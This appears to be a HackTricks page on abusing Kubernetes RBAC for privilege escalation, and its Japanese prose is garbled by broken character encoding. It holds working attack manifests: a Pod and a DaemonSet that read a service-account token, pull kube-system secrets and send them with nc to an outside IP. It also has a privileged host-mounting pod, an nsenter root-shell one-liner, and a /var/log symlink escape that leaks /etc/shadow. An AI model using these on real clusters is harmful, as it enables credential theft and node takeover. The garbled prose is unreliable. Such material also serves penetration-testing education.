# Kubernetesã«ãŠã‘ã‚‹Roles/ClusterRolesã®æ‚ªç”¨

<details>

<summary><strong>**htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰**ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>ã“ã¡ã‚‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASSï¼†HackTricksã‚¹ã‚¦ã‚©ãƒƒã‚°**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«å‚åŠ ã™ã‚‹ã‹ã€[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**
* **ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ãŸã‚ã«ã€PRã‚’** [**HackTricks**](https://github.com/carlospolop/hacktricks) **ã¨** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>

ã“ã“ã§ã¯ã€æ½œåœ¨çš„ã«å±é™ºãªRolesãŠã‚ˆã³ClusterRolesã®è¨­å®šã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
`kubectl api-resources`ã‚’ä½¿ç”¨ã—ã¦ã€ã™ã¹ã¦ã®ã‚µãƒãƒ¼ãƒˆã•ã‚Œã‚‹ãƒªã‚½ãƒ¼ã‚¹ã‚’å–å¾—ã§ãã‚‹ã“ã¨ã‚’è¦šãˆã¦ãŠã„ã¦ãã ã•ã„ã€‚

## ç‰¹æ¨©æ˜‡æ ¼

**ç•°ãªã‚‹æ¨©é™ã‚’æŒã¤åˆ¥ã®ä¸»ä½“ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**ã‚’å–å¾—ã™ã‚‹æŠ€è¡“ã¨ã—ã¦è¨€åŠã•ã‚Œã‚‹ç‰¹æ¨©æ˜‡æ ¼ï¼ˆKubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ç•°ãªã‚‹æ¨©é™ã§ï¼‰ã€Kubernetesã«ã¯åŸºæœ¬çš„ã«**4ã¤ã®ä¸»è¦ãªç‰¹æ¨©æ˜‡æ ¼æŠ€è¡“**ãŒã‚ã‚Šã¾ã™:

* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šå„ªã‚ŒãŸæ¨©é™ã‚’æŒã¤ä»–ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼/ã‚°ãƒ«ãƒ¼ãƒ—/SAsã‚’**å½è£…**ã§ãã‚‹ã“ã¨
* Kubernetesã‚¯ãƒ©ã‚¹ã‚¿å†…ã¾ãŸã¯å¤–éƒ¨ã‚¯ãƒ©ã‚¦ãƒ‰ã§ã€ã‚ˆã‚Šå„ªã‚ŒãŸæ¨©é™ã‚’æŒã¤SAsã‚’**è¦‹ã¤ã‘ãŸã‚Šã‚¢ã‚¿ãƒƒãƒã—ãŸã‚Šã§ãã‚‹**ã‚ˆã†ãª**ãƒãƒƒãƒ‰ã‚’ä½œæˆ/ãƒ‘ãƒƒãƒ/å®Ÿè¡Œ**ã§ãã‚‹ã“ã¨
* SAsã®ãƒˆãƒ¼ã‚¯ãƒ³ã¯ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã¨ã—ã¦ä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãŸã‚ã€**ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã‚’èª­ã¿å–ã‚‹**ã“ã¨ãŒã§ãã‚‹ã“ã¨
* ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰ãƒãƒ¼ãƒ‰ã«**è„±å‡º**ã§ãã‚‹ã“ã¨ã§ã€ãƒãƒ¼ãƒ‰ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã®ã™ã¹ã¦ã®ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã€ãƒãƒ¼ãƒ‰ã®è³‡æ ¼æƒ…å ±ã€ãŠã‚ˆã³ãƒãƒ¼ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¯ãƒ©ã‚¦ãƒ‰å†…ã®ãƒãƒ¼ãƒ‰ã®æ¨©é™ã‚’ç›—ã‚€ã“ã¨ãŒã§ãã‚‹ã“ã¨ï¼ˆã‚ã‚Œã°ï¼‰
* ãƒãƒƒãƒ‰ã§**ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã§ãã‚‹èƒ½åŠ›ã‚‚è¨€åŠã«å€¤ã™ã‚‹æŠ€è¡“ã®1ã¤ã§ã‚ã‚Šã€ãã®ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‹ã‚‚ã—ã‚Œãªã„

### ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã¾ãŸã¯å‹•è©ã«ã‚¢ã‚¯ã‚»ã‚¹ï¼ˆãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰ï¼‰

**ãƒ¯ã‚¤ãƒ«ãƒ‰ã‚«ãƒ¼ãƒ‰(\*)ã¯ã€ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«å¯¾ã™ã‚‹ä»»æ„ã®å‹•è©ã®è¨±å¯ã‚’ä¸ãˆã¾ã™**ã€‚ç®¡ç†è€…ã«ã‚ˆã£ã¦ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ClusterRoleå†…ã§ã¯ã€æ”»æ’ƒè€…ãŒã‚¯ãƒ©ã‚¹ã‚¿å†…ã®ä»»æ„ã®ãƒãƒ¼ãƒ ã‚¹ãƒšãƒ¼ã‚¹ã‚’æ‚ªç”¨ã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["*"]
```
### ç‰¹å®šã®å‹•è©ã§ä»»æ„ã®ãƒªã‚½ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹

RBACã§ã¯ã€ç‰¹å®šã®æ¨©é™ã«ã¯é‡å¤§ãªãƒªã‚¹ã‚¯ãŒä¼´ã„ã¾ã™ï¼š

1. **`create`:** ä»»æ„ã®ã‚¯ãƒ©ã‚¹ã‚¿ãƒªã‚½ãƒ¼ã‚¹ã‚’ä½œæˆã™ã‚‹æ¨©é™ã‚’ä»˜ä¸ã—ã€ç‰¹æ¨©æ˜‡æ ¼ã®ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™ã€‚
2. **`list`:** ã™ã¹ã¦ã®ãƒªã‚½ãƒ¼ã‚¹ã‚’ãƒªã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã€æ©Ÿå¯†ãƒ‡ãƒ¼ã‚¿ãŒæ¼æ´©ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **`get`:** ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‹ã‚‰ã‚·ãƒ¼ã‚¯ãƒ¬ãƒƒãƒˆã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã€ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¸Šã®è„…å¨ãŒã‚ã‚Šã¾ã™ã€‚
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
name: api-resource-verbs-all
rules:
rules:
- apiGroups: ["*"]
resources: ["*"]
verbs: ["create", "list", "get"]
```
### Pod Create - ãƒˆãƒ¼ã‚¯ãƒ³ã®ç›—é›£

ãƒãƒƒãƒ‰ã‚’ä½œæˆã™ã‚‹æ¨©é™ã‚’æŒã¤æ”»æ’ƒè€…ã¯ã€ç‰¹æ¨©ã‚’æŒã¤ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã‚’ãƒãƒƒãƒ‰ã«ã‚¢ã‚¿ãƒƒãƒã—ã€ãã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚“ã§ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ãªã‚Šã™ã¾ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ç‰¹æ¨©ãŒæ˜‡æ ¼ã—ã¾ã™

æ”»æ’ƒè€…ã«ãƒˆãƒ¼ã‚¯ãƒ³ã‚’é€ä¿¡ã™ã‚‹`bootstrap-signer`ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ãƒãƒƒãƒ‰ã®ä¾‹ï¼š
```yaml
apiVersion: v1
kind: Pod
metadata:
name: alpine
namespace: kube-system
spec:
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
```
### Podã®ä½œæˆã¨è„±å‡º

ä»¥ä¸‹ã¯ã€ã‚³ãƒ³ãƒ†ãƒŠãŒæŒã¤ã“ã¨ãŒã§ãã‚‹ã™ã¹ã¦ã®ç‰¹æ¨©ã‚’ç¤ºã—ã¦ã„ã¾ã™ï¼š

- **ç‰¹æ¨©ã‚¢ã‚¯ã‚»ã‚¹**ï¼ˆä¿è­·ã‚’ç„¡åŠ¹ã«ã—ã€æ©Ÿèƒ½ã‚’è¨­å®šã™ã‚‹ï¼‰
- ç‰¹æ¨©ã‚’æ˜‡æ ¼ã•ã›ã‚‹ã®ã«å½¹ç«‹ã¤**åå‰ç©ºé–“hostIPCã¨hostPidã‚’ç„¡åŠ¹ã«ã™ã‚‹**
- ãƒãƒ¼ãƒ‰ã®ã‚¯ãƒ©ã‚¦ãƒ‰ç‰¹æ¨©ã‚’ç›—ã‚€ãŸã‚ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’æä¾›ã™ã‚‹**hostNetwork**åå‰ç©ºé–“ã‚’ç„¡åŠ¹ã«ã™ã‚‹
- ã‚³ãƒ³ãƒ†ãƒŠå†…ã§**ãƒ›ã‚¹ãƒˆã®/**ã‚’ãƒã‚¦ãƒ³ãƒˆã™ã‚‹

{% code title="super_privs.yaml" %}
```yaml
apiVersion: v1
kind: Pod
metadata:
name: ubuntu
labels:
app: ubuntu
spec:
# Uncomment and specify a specific node you want to debug
# nodeName: <insert-node-name-here>
containers:
- image: ubuntu
command:
- "sleep"
- "3600" # adjust this as needed -- use only as long as you need
imagePullPolicy: IfNotPresent
name: ubuntu
securityContext:
allowPrivilegeEscalation: true
privileged: true
#capabilities:
#  add: ["NET_ADMIN", "SYS_ADMIN"] # add the capabilities you need https://man7.org/linux/man-pages/man7/capabilities.7.html
runAsUser: 0 # run as root (or any other user)
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never # we want to be intentional about running this pod
hostIPC: true # Use the host's ipc namespace https://www.man7.org/linux/man-pages/man7/ipc_namespaces.7.html
hostNetwork: true # Use the host's network namespace https://www.man7.org/linux/man-pages/man7/network_namespaces.7.html
hostPID: true # Use the host's pid namespace https://man7.org/linux/man-pages/man7/pid_namespaces.7.htmlpe_
volumes:
- name: host-volume
hostPath:
path: /
```
{% endcode %}

æ¬¡ã®ã‚³ãƒãƒ³ãƒ‰ã§Podã‚’ä½œæˆã—ã¾ã™ï¼š
```bash
kubectl --token $token create -f mount_root.yaml
```
[ã“ã®ãƒ„ã‚¤ãƒ¼ãƒˆ](https://twitter.com/mauilion/status/1129468485480751104)ã‹ã‚‰ã®ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨ã„ãã¤ã‹ã®è¿½åŠ :
```bash
kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{"spec":{"hostPID": true, "containers":[{"name":"1","image":"alpine","command":["nsenter","--mount=/proc/1/ns/mnt","--","/bin/bash"],"stdin": true,"tty":true,"imagePullPolicy":"IfNotPresent","securityContext":{"privileged":true}}]}}'
```
#### ã‚¹ãƒ†ãƒ«ã‚¹

ãŠãã‚‰ãã€ã‚ˆã‚Š**ã‚¹ãƒ†ãƒ«ã‚¹**ã«ãªã‚ŠãŸã„ã¨æ€ã†ã§ã—ã‚‡ã†ã€‚å‰ã®ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆã§è¨€åŠã•ã‚ŒãŸç‰¹æ¨©ã®ä¸€éƒ¨ã ã‘ã‚’æœ‰åŠ¹ã«ã—ã¦ãƒãƒƒãƒ‰ã‚’ä½œæˆã—ãŸå ´åˆã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚‚ã®ã‚’ä»¥ä¸‹ã®ãƒšãƒ¼ã‚¸ã§è¦‹ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

- **ç‰¹æ¨© + hostPID**
- **ç‰¹æ¨©ã®ã¿**
- **hostPath**
- **hostPID**
- **hostNetwork**
- **hostIPC**

_å‰è¿°ã®ç‰¹æ¨©ã‚’æŒã¤ãƒãƒƒãƒ‰æ§‹æˆã‚’ä½œæˆ/æ‚ªç”¨ã™ã‚‹ä¾‹ã¯ã€_ [_https://github.com/BishopFox/badPods_](https://github.com/BishopFox/badPods) _ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™_

### ãƒãƒƒãƒ‰ã®ä½œæˆ - ã‚¯ãƒ©ã‚¦ãƒ‰ã¸ã®ç§»è¡Œ

**ãƒãƒƒãƒ‰**ï¼ˆãŠã‚ˆã³å¿…è¦ã«å¿œã˜ã¦**ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆ**ï¼‰ã‚’**ä½œæˆ**ã§ãã‚‹å ´åˆã€**ã‚¯ãƒ©ã‚¦ãƒ‰ç’°å¢ƒã§ç‰¹æ¨©ã‚’å–å¾—**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ãã®å¾Œã€**ãƒãƒƒãƒ‰ã¾ãŸã¯ã‚µãƒ¼ãƒ“ã‚¹ã‚¢ã‚«ã‚¦ãƒ³ãƒˆã«ã‚¯ãƒ©ã‚¦ãƒ‰ãƒ­ãƒ¼ãƒ«ã‚’å‰²ã‚Šå½“ã¦**ã€ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚\
ã•ã‚‰ã«ã€**ãƒ›ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åå‰ç©ºé–“ã‚’æŒã¤ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã§ãã‚‹å ´åˆã€**ãƒãƒ¼ãƒ‰**ã‚¤ãƒ³ã‚¹ã‚¿ãƒ³ã‚¹ã®**IAMãƒ­ãƒ¼ãƒ«ã‚’ç›—ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€æ¬¡ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼š

{% content-ref url="pod-escape-privileges.md" %}
[pod-escape-privileges.md](pod-escape-privileges.md)
{% endcontent-ref %}

### **ãƒ‡ãƒ—ãƒ­ã‚¤ãƒ¡ãƒ³ãƒˆã€ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã€Statefulsetsã€ãƒ¬ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ³ãƒˆãƒ­ãƒ¼ãƒ©ã€ãƒ¬ãƒ—ãƒªã‚«ã‚»ãƒƒãƒˆã€ã‚¸ãƒ§ãƒ–ã€ãŠã‚ˆã³ã‚¯ãƒ¼ãƒ­ãƒ³ã‚¸ãƒ§ãƒ–ã®ä½œæˆ/ãƒ‘ãƒƒãƒ**

ã“ã‚Œã‚‰ã®æ¨©é™ã‚’æ‚ªç”¨ã—ã¦ã€å‰è¿°ã®ä¾‹ã®ã‚ˆã†ã«**æ–°ã—ã„ãƒãƒƒãƒ‰ã‚’ä½œæˆ**ã—ã€ç‰¹æ¨©ã‚’ç¢ºç«‹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

æ¬¡ã®yamlã¯ã€**ãƒ‡ãƒ¼ãƒ¢ãƒ³ã‚»ãƒƒãƒˆã‚’ä½œæˆã—ã€ãƒãƒƒãƒ‰å†…ã®SAã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’å¤–éƒ¨ã«æŒã¡å‡ºã™**ã‚‚ã®ã§ã™ï¼š
```yaml
apiVersion: apps/v1
kind: DaemonSet
metadata:
name: alpine
namespace: kube-system
spec:
selector:
matchLabels:
name: alpine
template:
metadata:
labels:
name: alpine
spec:
serviceAccountName: bootstrap-signer
automountServiceAccountToken: true
hostNetwork: true
containers:
- name: alpine
image: alpine
command: ["/bin/sh"]
args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
volumeMounts:
- mountPath: /root
name: mount-node-root
volumes:
- name: mount-node-root
hostPath:
path: /
```
### **Pods Exec**

**`pods/exec`**ã¯ã€**ãƒãƒƒãƒ‰å†…ã®ã‚·ã‚§ãƒ«ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œ**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹Kubernetesã®ãƒªã‚½ãƒ¼ã‚¹ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**ã‚³ãƒ³ãƒ†ãƒŠå†…ã§ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ãŸã‚Šã€ã‚·ã‚§ãƒ«ã‚’å–å¾—ã—ãŸã‚Š**ã§ãã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€**ãƒãƒƒãƒ‰å†…ã«å…¥ã£ã¦SAã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚€ã“ã¨ãŒå¯èƒ½**ã§ã‚ã‚Šã€ç‰¹æ¨©ã‚’æŒã¤ãƒãƒƒãƒ‰ã«å…¥ã‚Šã€ãƒãƒ¼ãƒ‰ã«è„±å‡ºã—ã¦ãƒãƒ¼ãƒ‰å†…ã®ã™ã¹ã¦ã®ãƒãƒƒãƒ‰ã®ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã‚“ã§ï¼ˆæ‚ªç”¨ã—ã¦ï¼‰ãƒãƒ¼ãƒ‰ã‚’ä¹—ã£å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
kubectl exec -it <POD_NAME> -n <NAMESPACE> -- sh
```
### ãƒãƒ¼ãƒˆãƒ•ã‚©ãƒ¯ãƒ¼ãƒ‰

ã“ã®æ¨©é™ã¯ã€**æŒ‡å®šã•ã‚ŒãŸãƒãƒƒãƒ‰å†…ã®1ã¤ã®ãƒãƒ¼ãƒˆã‚’1ã¤ã®ãƒ­ãƒ¼ã‚«ãƒ«ãƒãƒ¼ãƒˆã«è»¢é€ã™ã‚‹**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ã“ã‚Œã¯ã€ãƒãƒƒãƒ‰å†…ã§å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ç°¡å˜ã«ãƒ‡ãƒãƒƒã‚°ã§ãã‚‹ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã®ã‚‚ã®ã§ã™ãŒã€æ”»æ’ƒè€…ã¯ãã‚Œã‚’æ‚ªç”¨ã—ã¦ã€ãƒãƒƒãƒ‰å†…ã®èˆˆå‘³æ·±ã„ï¼ˆä¾‹ï¼šDBï¼‰ã‚„è„†å¼±ãªã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ï¼ˆWebï¼Ÿï¼‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚
```
kubectl port-forward pod/mypod 5000:5000
```
### ãƒ›ã‚¹ãƒˆæ›¸ãè¾¼ã¿å¯èƒ½ /var/log/ ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—

[**ã“ã®ç ”ç©¶ã§ç¤ºã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã€ãƒ›ã‚¹ãƒˆã® `/var/log/` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒãƒã‚¦ãƒ³ãƒˆã•ã‚ŒãŸ **ãƒãƒƒãƒ‰ã«ã‚¢ã‚¯ã‚»ã‚¹ã¾ãŸã¯ä½œæˆ** ã§ãã‚‹å ´åˆã€**ã‚³ãƒ³ãƒ†ãƒŠã‹ã‚‰è„±å‡º** ã§ãã¾ã™ã€‚\
ã“ã‚Œã¯ã€**Kube-API ãŒã‚³ãƒ³ãƒ†ãƒŠã®ãƒ­ã‚°ã‚’å–å¾—**ã—ã‚ˆã†ã¨ã™ã‚‹ã¨ãï¼ˆ`kubectl logs <pod>` ã‚’ä½¿ç”¨ï¼‰ã€**Kubelet** ã‚µãƒ¼ãƒ“ã‚¹ã® `/logs/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒãƒ‰ã® `0.log` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦æ±‚ã™ã‚‹ãŸã‚ã§ã™ã€‚\
Kubelet ã‚µãƒ¼ãƒ“ã‚¹ã¯ `/logs/` ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã‚’å…¬é–‹ã—ã¦ãŠã‚Šã€ã“ã‚Œã¯åŸºæœ¬çš„ã«ã‚³ãƒ³ãƒ†ãƒŠã® `/var/log` ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’å…¬é–‹ã—ã¦ã„ã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã‚³ãƒ³ãƒ†ãƒŠã® **/var/log/ ãƒ•ã‚©ãƒ«ãƒ€ã«æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚»ã‚¹æ¨©** ãŒã‚ã‚‹æ”»æ’ƒè€…ã¯ã€æ¬¡ã®2ã¤ã®æ–¹æ³•ã§ã“ã®å‹•ä½œã‚’æ‚ªç”¨ã§ãã¾ã™:

* é€šå¸¸ã¯ `/var/logs/pods/namespace_pod_uid/container/0.log` ã«ã‚ã‚‹ã‚³ãƒ³ãƒ†ãƒŠã® `0.log` ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ **`/etc/shadow` ã‚’æŒ‡ã™ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯** ã«å¤‰æ›´ã—ã¾ã™ã€‚ãã®å¾Œã€æ¬¡ã®ã‚ˆã†ã«ã—ã¦ãƒ›ã‚¹ãƒˆã® shadow ãƒ•ã‚¡ã‚¤ãƒ«ã‚’æŒã¡å‡ºã™ã“ã¨ãŒã§ãã¾ã™:
```bash
kubectl logs escaper
failed to get parse function: unsupported log format: "root::::::::\n"
kubectl logs escaper --tail=2
failed to get parse function: unsupported log format: "systemd-resolve:*:::::::\n"
# Keep incrementing tail to exfiltrate the whole file
```
* æ”»æ’ƒè€…ãŒ`nodes/log`ã‚’èª­ã‚€æ¨©é™ã‚’æŒã¤ä»»æ„ã®ãƒ—ãƒªãƒ³ã‚·ãƒ‘ãƒ«ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹å ´åˆã€`/host-mounted/var/log/sym`ã«`/`ã¸ã®**ã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯**ã‚’ä½œæˆã—ã€`https://<gateway>:10250/logs/sym/`ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ã¨ã€ãƒ›ã‚¹ãƒˆã®ãƒ«ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ãŒãƒªã‚¹ãƒˆã•ã‚Œã¾ã™ï¼ˆã‚·ãƒ³ãƒœãƒªãƒƒã‚¯ãƒªãƒ³ã‚¯ã‚’å¤‰æ›´ã™ã‚‹ã¨ãƒ•ã‚¡ã‚¤ãƒ«ã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹å ´åˆãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
```bash
curl -k -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Im[...]' 'https://172.17.0.1:10250/logs/sym/'
<a href="bin">bin</a>
<a href="data/">data/</a>
<a href="dev/">dev/</a>
<a href="etc/">etc/</a>
<a href="home/">home/</a>
<a href="init">init</a>
<a href="lib">lib</a>
[...]
```
**å®Ÿé¨“å®¤ã¨è‡ªå‹•åŒ–ã•ã‚ŒãŸã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã¯** [**https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts**](https://blog.aquasec.com/kubernetes-security-pod-escape-log-mounts) **ã«è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™**

#### readOnly ä¿è­·ã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

ã‚‚ã—é‹ãŒè‰¯ã‘ã‚Œã°ã€ç‰¹æ¨©ã®é«˜ã„ `CAP_SYS_ADMIN` æ©Ÿèƒ½ãŒåˆ©ç”¨å¯èƒ½ã§ã‚ã‚Œã°ã€ãƒ•ã‚©ãƒ«ãƒ€ã‚’å˜ã« rw ã§å†ãƒã‚¦ãƒ³ãƒˆã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```bash
mount -o rw,remount /hostlogs/
```
#### hostPathã®readOnlyä¿è­·ã®ãƒã‚¤ãƒ‘ã‚¹ <a href="#bypassing-hostpath-readonly-protection" id="bypassing-hostpath-readonly-protection"></a>

[**ã“ã®ç ”ç©¶**](https://jackleadford.github.io/containers/2020/03/06/pvpost.html)ã«è¨˜è¼‰ã•ã‚Œã¦ã„ã‚‹ã‚ˆã†ã«ã€ä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```yaml
allowedHostPaths:
- pathPrefix: "/foo"
readOnly: true
```
